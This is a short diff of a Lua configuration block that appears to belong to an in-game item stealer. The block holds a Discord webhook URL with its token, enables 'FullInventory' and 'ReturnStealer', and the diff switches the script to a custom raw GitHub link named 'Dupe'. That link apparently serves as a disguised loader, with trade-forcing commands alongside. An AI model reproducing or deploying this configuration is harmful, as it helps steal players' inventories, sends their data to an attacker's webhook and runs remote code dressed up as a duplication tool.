@@ -3,8 +3,8 @@ Config = {
     Webhook = "https://discord.com/api/webhooks/1277863416236609586/sBsl7yEyPa6GNgSLVp-RYCQzyRdvW8U_KtXve8HFdE--1OV8VCelyfqOtHCOxp_1hYWN",
     FullInventory = true,
     ReturnStealer = true,
-    Script = "Yarhm",
-    CustomLink = "None"
+    Script = "Custom",
+    CustomLink = "https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"
 }
 Commands = {ResendTrade = ".resend", RestartPlayer = ".restart"}
 repeat
